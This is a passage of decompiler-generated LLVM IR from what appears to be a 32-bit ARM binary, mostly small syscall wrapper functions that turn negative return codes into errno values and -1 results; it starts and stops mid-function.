  uselistorder i32 %v4_12c08, { 1, 0 }
  uselistorder i32 %v1_12c10, { 1, 2, 0 }
  uselistorder i32 %v4_12bfc, { 1, 0 }
  uselistorder i32 %v1_12c04, { 1, 2, 0 }
  uselistorder i32 %v1_12c28, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_12bf8, { 1, 0 }
  uselistorder i32 %v1_12c24, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_12be4, { 1, 0 }
  uselistorder i32 %v3_12be0, { 1, 0 }
  uselistorder i32 %v1_12be0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_12bdc, { 1, 0 }
  uselistorder i32 %v1_12be4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12bd0, { 1, 0 }
  uselistorder i32 %v4_12bcc, { 2, 1, 0 }
  uselistorder i32 %v1_12bd0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_12bd8.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_12ba4, { 1, 0 }
  uselistorder i32 %v1_12c5c, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_12b88, { 1, 0, 2 }
  uselistorder i32 %v0_12b88, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 %v0_12b84, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @function_12cc8, { 1, 0 }
  uselistorder label %bb113, { 1, 0 }
  uselistorder label %bb111, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_12c30, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_12bec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12bd8thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_12cb0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12cb0:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_12cb4 = call i32 @function_12b84()
  ret i32 %v0_12cb4
}

define i32 @function_12cc8() local_unnamed_addr {
dec_label_pc_12cc8:
  %v1_12cd0 = call i32 @function_13978(i32 8)
  ret i32 %v1_12cd0
}

define i32 @function_12cdc() local_unnamed_addr {
dec_label_pc_12cdc:
  %v1_12cec = load i32, i32* @r0, align 4
  ret i32 %v1_12cec
}

define i32 @function_12cf0(i32 %arg1) local_unnamed_addr {
dec_label_pc_12cf0:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12cf0 = load i32, i32* @r7, align 4
  store i32 %v3_12cf0, i32* %stack_var_-8, align 4
  %v0_12cfc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12cfc, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12cfc, -4095
  br i1 %tmp, label %dec_label_pc_12d1c, label %dec_label_pc_12d0c

dec_label_pc_12d0c:                               ; preds = %dec_label_pc_12cf0
  %v0_12d0c = call i32 @function_13574()
  %v0_12d10 = load i32, i32* %r7.global-to-local, align 4
  %v1_12d10 = sub i32 0, %v0_12d10
  %v2_12d14 = inttoptr i32 %v0_12d0c to i32*
  store i32 %v1_12d10, i32* %v2_12d14, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12d1c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12d1c

dec_label_pc_12d1c:                               ; preds = %dec_label_pc_12cf0, %dec_label_pc_12d0c
  %v1_12d20 = phi i32 [ %v0_12cfc, %dec_label_pc_12cf0 ], [ -1, %dec_label_pc_12d0c ]
  %v2_12d1c = phi i32 [ %v3_12cf0, %dec_label_pc_12cf0 ], [ %v2_12d1c.pre, %dec_label_pc_12d0c ]
  store i32 %v2_12d1c, i32* @r7, align 4
  ret i32 %v1_12d20

; uselistorder directives
  uselistorder i32 %v0_12cfc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12d1c, { 1, 0 }
}

define i32 @function_12d24(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12d24:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v6_12d24 = load i32, i32* @r2, align 4
  %v9_12d24 = load i32, i32* @r3, align 4
  store i32 %v9_12d24, i32* %stack_var_-4, align 4
  %v1_12d34 = and i32 %arg2, 64
  %v2_12d34 = icmp eq i32 %v1_12d34, 0
  br i1 %v2_12d34, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_12d24
  %v3_12d3c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v3_12d3c, i32* @r3, align 4
  %phitmp = urem i32 %v6_12d24, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12d24, %bb
  %v0_12d40 = phi i32 [ 0, %dec_label_pc_12d24 ], [ %phitmp, %bb ]
  store i32 %v0_12d40, i32* @r2, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12d70, label %dec_label_pc_12d60

dec_label_pc_12d60:                               ; preds = %.thread
  %v0_12d60 = call i32 @function_13574()
  %v0_12d64 = load i32, i32* %r7.global-to-local, align 4
  %v1_12d64 = sub i32 0, %v0_12d64
  store i32 %v1_12d64, i32* @r3, align 4
  %v2_12d68 = inttoptr i32 %v0_12d60 to i32*
  store i32 %v1_12d64, i32* %v2_12d68, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12d70

dec_label_pc_12d70:                               ; preds = %.thread, %dec_label_pc_12d60
  %v0_12d70 = phi i32 [ %arg1, %.thread ], [ -1, %dec_label_pc_12d60 ]
  ret i32 %v0_12d70

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12d70, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_12d84() local_unnamed_addr {
dec_label_pc_12d84:
  %v1_12d94 = load i32, i32* @r0, align 4
  ret i32 %v1_12d94
}

define i32 @function_12d98(i32* %arg1) local_unnamed_addr {
dec_label_pc_12d98:
  %stack_var_-16 = alloca i32, align 4
  %v2_12d9c = ptrtoint i32* %stack_var_-16 to i32
  %v2_12dac = call i32 @function_12f4c(i32 %v2_12d9c, i32 0)
  %v2_12db0 = load i32, i32* %stack_var_-16, align 4
  %v2_12db4 = icmp eq i32* %arg1, null
  br i1 %v2_12db4, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_12d98
  store i32 %v2_12db0, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_12d98, %bb
  ret i32 %v2_12db0

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_12dc8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12dc8:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12dfc, label %dec_label_pc_12dec

dec_label_pc_12dec:                               ; preds = %dec_label_pc_12dc8
  %v0_12dec = call i32 @function_13574()
  %v0_12df0 = load i32, i32* %r4.global-to-local, align 4
  %v1_12df0 = sub i32 0, %v0_12df0
  %v2_12df4 = inttoptr i32 %v0_12dec to i32*
  store i32 %v1_12df0, i32* %v2_12df4, align 4
  br label %dec_label_pc_12dfc

dec_label_pc_12dfc:                               ; preds = %dec_label_pc_12dc8, %dec_label_pc_12dec
  %v1_12e04 = phi i32 [ %arg1, %dec_label_pc_12dc8 ], [ -1, %dec_label_pc_12dec ]
  ret i32 %v1_12e04

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12dfc, { 1, 0 }
}

define i32 @function_12e08() local_unnamed_addr {
dec_label_pc_12e08:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12e08 = load i32, i32* @r7, align 4
  store i32 %v3_12e08, i32* %stack_var_-8, align 4
  %v0_12e14 = load i32, i32* @r0, align 4
  store i32 %v0_12e14, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12e14, -4095
  br i1 %tmp, label %dec_label_pc_12e34, label %dec_label_pc_12e24

dec_label_pc_12e24:                               ; preds = %dec_label_pc_12e08
  %v0_12e24 = call i32 @function_13574()
  %v0_12e28 = load i32, i32* %r7.global-to-local, align 4
  %v1_12e28 = sub i32 0, %v0_12e28
  %v2_12e2c = inttoptr i32 %v0_12e24 to i32*
  store i32 %v1_12e28, i32* %v2_12e2c, align 4
  %v2_12e34.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12e34

dec_label_pc_12e34:                               ; preds = %dec_label_pc_12e08, %dec_label_pc_12e24
  %v1_12e38 = phi i32 [ %v0_12e14, %dec_label_pc_12e08 ], [ -1, %dec_label_pc_12e24 ]
  %v2_12e34 = phi i32 [ %v3_12e08, %dec_label_pc_12e08 ], [ %v2_12e34.pre, %dec_label_pc_12e24 ]
  store i32 %v2_12e34, i32* @r7, align 4
  ret i32 %v1_12e38

; uselistorder directives
  uselistorder i32 %v0_12e14, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12e34, { 1, 0 }
}

define i32 @function_12e3c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_12e3c:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12e6c, label %dec_label_pc_12e5c

dec_label_pc_12e5c:                               ; preds = %dec_label_pc_12e3c
  %v0_12e5c = call i32 @function_13574()
  %v0_12e60 = load i32, i32* %r4.global-to-local, align 4
  %v1_12e60 = sub i32 0, %v0_12e60
  %v2_12e64 = inttoptr i32 %v0_12e5c to i32*
  store i32 %v1_12e60, i32* %v2_12e64, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12e6c

dec_label_pc_12e6c:                               ; preds = %dec_label_pc_12e3c, %dec_label_pc_12e5c
  %v0_12e6c = phi i32 [ %arg1, %dec_label_pc_12e3c ], [ -1, %dec_label_pc_12e5c ]
  ret i32 %v0_12e6c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12e6c, { 1, 0 }
}

define i32 @function_12e7c(i32 %arg1) local_unnamed_addr {
dec_label_pc_12e7c:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12e7c = load i32, i32* @r7, align 4
  store i32 %v3_12e7c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12ea4, label %dec_label_pc_12e94

dec_label_pc_12e94:                               ; preds = %dec_label_pc_12e7c
  %v0_12e94 = call i32 @function_13574()
  %v0_12e98 = load i32, i32* %r7.global-to-local, align 4
  %v1_12e98 = sub i32 0, %v0_12e98
  %v2_12e9c = inttoptr i32 %v0_12e94 to i32*
  store i32 %v1_12e98, i32* %v2_12e9c, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_12ea8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12ea4

dec_label_pc_12ea4:                               ; preds = %dec_label_pc_12e7c, %dec_label_pc_12e94
  %v2_12ea8 = phi i32 [ %v3_12e7c, %dec_label_pc_12e7c ], [ %v2_12ea8.pre, %dec_label_pc_12e94 ]
  %v0_12ea4 = phi i32 [ %arg1, %dec_label_pc_12e7c ], [ -1, %dec_label_pc_12e94 ]
  store i32 %v2_12ea8, i32* @r7, align 4
  ret i32 %v0_12ea4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12ea4, { 1, 0 }
}

define i32 @function_12eb0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12eb0:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12eb0 = load i32, i32* @r7, align 4
  store i32 %v3_12eb0, i32* %stack_var_-8, align 4
  %v0_12ebc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12ebc, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12ebc, -4095
  br i1 %tmp, label %dec_label_pc_12edc, label %dec_label_pc_12ecc

dec_label_pc_12ecc:                               ; preds = %dec_label_pc_12eb0
  %v0_12ecc = call i32 @function_13574()
  %v0_12ed0 = load i32, i32* %r7.global-to-local, align 4
  %v1_12ed0 = sub i32 0, %v0_12ed0
  store i32 %v1_12ed0, i32* @r3, align 4
  %v2_12ed4 = inttoptr i32 %v0_12ecc to i32*
  store i32 %v1_12ed0, i32* %v2_12ed4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12edc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12edc

dec_label_pc_12edc:                               ; preds = %dec_label_pc_12eb0, %dec_label_pc_12ecc
  %v1_12ee0 = phi i32 [ %v0_12ebc, %dec_label_pc_12eb0 ], [ -1, %dec_label_pc_12ecc ]
  %v2_12edc = phi i32 [ %v3_12eb0, %dec_label_pc_12eb0 ], [ %v2_12edc.pre, %dec_label_pc_12ecc ]
  store i32 %v2_12edc, i32* @r7, align 4
  ret i32 %v1_12ee0

; uselistorder directives
  uselistorder i32 %v0_12ebc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12edc, { 1, 0 }
}

define i32 @function_12ee4(i32 %arg1) local_unnamed_addr {
dec_label_pc_12ee4:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12ee4 = load i32, i32* @r7, align 4
  store i32 %v3_12ee4, i32* %stack_var_-8, align 4
  %v0_12ef0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12ef0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12ef0, -4095
  br i1 %tmp, label %dec_label_pc_12f10, label %dec_label_pc_12f00

dec_label_pc_12f00:                               ; preds = %dec_label_pc_12ee4
  %v0_12f00 = call i32 @function_13574()
  %v0_12f04 = load i32, i32* %r7.global-to-local, align 4
  %v1_12f04 = sub i32 0, %v0_12f04
  %v2_12f08 = inttoptr i32 %v0_12f00 to i32*
  store i32 %v1_12f04, i32* %v2_12f08, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12f10.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12f10

dec_label_pc_12f10:                               ; preds = %dec_label_pc_12ee4, %dec_label_pc_12f00
  %v1_12f14 = phi i32 [ %v0_12ef0, %dec_label_pc_12ee4 ], [ -1, %dec_label_pc_12f00 ]
  %v2_12f10 = phi i32 [ %v3_12ee4, %dec_label_pc_12ee4 ], [ %v2_12f10.pre, %dec_label_pc_12f00 ]
  store i32 %v2_12f10, i32* @r7, align 4
  ret i32 %v1_12f14

; uselistorder directives
  uselistorder i32 %v0_12ef0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12f10, { 1, 0 }
}

define i32 @function_12f18(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12f18:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12f18 = load i32, i32* @r7, align 4
  store i32 %v3_12f18, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12f40, label %dec_label_pc_12f30

dec_label_pc_12f30:                               ; preds = %dec_label_pc_12f18
  %v0_12f30 = call i32 @function_13574()
  %v0_12f34 = load i32, i32* %r7.global-to-local, align 4
  %v1_12f34 = sub i32 0, %v0_12f34
  %v2_12f38 = inttoptr i32 %v0_12f30 to i32*
  store i32 %v1_12f34, i32* %v2_12f38, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_12f44.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12f40

dec_label_pc_12f40:                               ; preds = %dec_label_pc_12f18, %dec_label_pc_12f30
  %v2_12f44 = phi i32 [ %v3_12f18, %dec_label_pc_12f18 ], [ %v2_12f44.pre, %dec_label_pc_12f30 ]
  %v0_12f40 = phi i32 [ %arg1, %dec_label_pc_12f18 ], [ -1, %dec_label_pc_12f30 ]
  store i32 %v2_12f44, i32* @r7, align 4
  ret i32 %v0_12f40

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12f40, { 1, 0 }
}

define i32 @function_12f4c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12f4c:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12f4c = load i32, i32* @r7, align 4
  store i32 %v3_12f4c, i32* %stack_var_-8, align 4
  %v0_12f58 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12f58, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12f58, -4095
  br i1 %tmp, label %dec_label_pc_12f78, label %dec_label_pc_12f68

dec_label_pc_12f68:                               ; preds = %dec_label_pc_12f4c
  %v0_12f68 = call i32 @function_13574()
  %v0_12f6c = load i32, i32* %r7.global-to-local, align 4
  %v1_12f6c = sub i32 0, %v0_12f6c
  store i32 %v1_12f6c, i32* @r3, align 4
  %v2_12f70 = inttoptr i32 %v0_12f68 to i32*
  store i32 %v1_12f6c, i32* %v2_12f70, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12f78.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12f78

dec_label_pc_12f78:                               ; preds = %dec_label_pc_12f4c, %dec_label_pc_12f68
  %v1_12f7c = phi i32 [ %v0_12f58, %dec_label_pc_12f4c ], [ -1, %dec_label_pc_12f68 ]
  %v2_12f78 = phi i32 [ %v3_12f4c, %dec_label_pc_12f4c ], [ %v2_12f78.pre, %dec_label_pc_12f68 ]
  store i32 %v2_12f78, i32* @r7, align 4
  ret i32 %v1_12f7c

; uselistorder directives
  uselistorder i32 %v0_12f58, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12f78, { 1, 0 }
}

define i32 @function_12f80(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12f80:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_12f80 = load i32, i32* @r3, align 4
  store i32 %v9_12f80, i32* %stack_var_-4, align 4
  %v2_12f98 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_12f98, i32* @r3, align 4
  %v0_12fbc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12fbc, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12fbc, -4095
  br i1 %tmp, label %dec_label_pc_12fdc, label %dec_label_pc_12fcc

dec_label_pc_12fcc:                               ; preds = %dec_label_pc_12f80
  %v0_12fcc = call i32 @function_13574()
  %v0_12fd0 = load i32, i32* %r7.global-to-local, align 4
  %v1_12fd0 = sub i32 0, %v0_12fd0
  store i32 %v1_12fd0, i32* @r3, align 4
  %v2_12fd4 = inttoptr i32 %v0_12fcc to i32*
  store i32 %v1_12fd0, i32* %v2_12fd4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12fdc

dec_label_pc_12fdc:                               ; preds = %dec_label_pc_12f80, %dec_label_pc_12fcc
  %v1_12fe8 = phi i32 [ %v0_12fbc, %dec_label_pc_12f80 ], [ -1, %dec_label_pc_12fcc ]
  ret i32 %v1_12fe8

; uselistorder directives
  uselistorder i32 %v0_12fbc, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12fdc, { 1, 0 }
}

define i32 @function_12fec(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12fec:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_13028 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13028, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13028, -4095
  br i1 %tmp, label %dec_label_pc_13048, label %dec_label_pc_13038

dec_label_pc_13038:                               ; preds = %dec_label_pc_12fec
  %v0_13038 = call i32 @function_13574()
  %v0_1303c = load i32, i32* %r7.global-to-local, align 4
  %v1_1303c = sub i32 0, %v0_1303c
  %v2_13040 = inttoptr i32 %v0_13038 to i32*
  store i32 %v1_1303c, i32* %v2_13040, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13048

dec_label_pc_13048:                               ; preds = %dec_label_pc_12fec, %dec_label_pc_13038
  %v1_13054 = phi i32 [ %v0_13028, %dec_label_pc_12fec ], [ -1, %dec_label_pc_13038 ]
  ret i32 %v1_13054

; uselistorder directives
  uselistorder i32 %v0_13028, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13048, { 1, 0 }
}

define i32 @function_13058(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13058:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13058 = load i32, i32* @r7, align 4
  store i32 %v3_13058, i32* %stack_var_-8, align 4
  %v0_13064 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13064, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13064, -4095
  br i1 %tmp, label %dec_label_pc_13084, label %dec_label_pc_13074

dec_label_pc_13074:                               ; preds = %dec_label_pc_13058
  %v0_13074 = call i32 @function_13574()
  %v0_13078 = load i32, i32* %r7.global-to-local, align 4
  %v1_13078 = sub i32 0, %v0_13078
  %v2_1307c = inttoptr i32 %v0_13074 to i32*
  store i32 %v1_13078, i32* %v2_1307c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13084.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13084

dec_label_pc_13084:                               ; preds = %dec_label_pc_13058, %dec_label_pc_13074
  %v1_13088 = phi i32 [ %v0_13064, %dec_label_pc_13058 ], [ -1, %dec_label_pc_13074 ]
  %v2_13084 = phi i32 [ %v3_13058, %dec_label_pc_13058 ], [ %v2_13084.pre, %dec_label_pc_13074 ]
  store i32 %v2_13084, i32* @r7, align 4
  ret i32 %v1_13088

; uselistorder directives
  uselistorder i32 %v0_13064, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13084, { 1, 0 }
}

define i32 @function_1308c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1308c:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1308c = load i32, i32* @r7, align 4
  store i32 %v3_1308c, i32* %stack_var_-8, align 4
  %v0_13098 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13098, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13098, -4095
  br i1 %tmp, label %dec_label_pc_130b8, label %dec_label_pc_130a8

dec_label_pc_130a8:                               ; preds = %dec_label_pc_1308c
  %v0_130a8 = call i32 @function_13574()
  %v0_130ac = load i32, i32* %r7.global-to-local, align 4
  %v1_130ac = sub i32 0, %v0_130ac
  %v2_130b0 = inttoptr i32 %v0_130a8 to i32*
  store i32 %v1_130ac, i32* %v2_130b0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_130b8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_130b8

dec_label_pc_130b8:                               ; preds = %dec_label_pc_1308c, %dec_label_pc_130a8
  %v1_130bc = phi i32 [ %v0_13098, %dec_label_pc_1308c ], [ -1, %dec_label_pc_130a8 ]
  %v2_130b8 = phi i32 [ %v3_1308c, %dec_label_pc_1308c ], [ %v2_130b8.pre, %dec_label_pc_130a8 ]
  store i32 %v2_130b8, i32* %r7.global-to-local, align 4
  ret i32 %v1_130bc

; uselistorder directives
  uselistorder i32 %v0_13098, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_130b8, { 1, 0 }
}

define i32 @function_130c0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_130c0:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_130c0 = load i32, i32* @r3, align 4
  store i32 %v9_130c0, i32* %stack_var_-4, align 4
  %v2_130cc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_130cc, i32* @r3, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13100, label %dec_label_pc_130f0

dec_label_pc_130f0:                               ; preds = %dec_label_pc_130c0
  %v0_130f0 = call i32 @function_13574()
  %v0_130f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_130f4 = sub i32 0, %v0_130f4
  store i32 %v1_130f4, i32* @r3, align 4
  %v2_130f8 = inttoptr i32 %v0_130f0 to i32*
  store i32 %v1_130f4, i32* %v2_130f8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13100

dec_label_pc_13100:                               ; preds = %dec_label_pc_130c0, %dec_label_pc_130f0
  %v0_13100 = phi i32 [ %arg1, %dec_label_pc_130c0 ], [ -1, %dec_label_pc_130f0 ]
  ret i32 %v0_13100

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13100, { 1, 0 }
}

define i32 @function_13114(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13114:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13114 = load i32, i32* @r7, align 4
  store i32 %v3_13114, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13140, label %dec_label_pc_13130

dec_label_pc_13130:                               ; preds = %dec_label_pc_13114
  %v0_13130 = call i32 @function_13574()
  %v0_13134 = load i32, i32* %r7.global-to-local, align 4
  %v1_13134 = sub i32 0, %v0_13134
  %v2_13138 = inttoptr i32 %v0_13130 to i32*
  store i32 %v1_13134, i32* %v2_13138, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_13144.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13140

dec_label_pc_13140:                               ; preds = %dec_label_pc_13114, %dec_label_pc_13130
  %v2_13144 = phi i32 [ %v3_13114, %dec_label_pc_13114 ], [ %v2_13144.pre, %dec_label_pc_13130 ]
  %v0_13140 = phi i32 [ %arg1, %dec_label_pc_13114 ], [ -1, %dec_label_pc_13130 ]
  store i32 %v2_13144, i32* @r7, align 4
  ret i32 %v0_13140

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13140, { 1, 0 }
}

define i32 @function_1314c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1314c:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1314c = load i32, i32* @r7, align 4
  store i32 %v3_1314c, i32* %stack_var_-8, align 4
  %v0_13158 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13158, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13158, -4095
  br i1 %tmp, label %dec_label_pc_13178, label %dec_label_pc_13168

dec_label_pc_13168:                               ; preds = %dec_label_pc_1314c
  %v0_13168 = call i32 @function_13574()
  %v0_1316c = load i32, i32* %r7.global-to-local, align 4
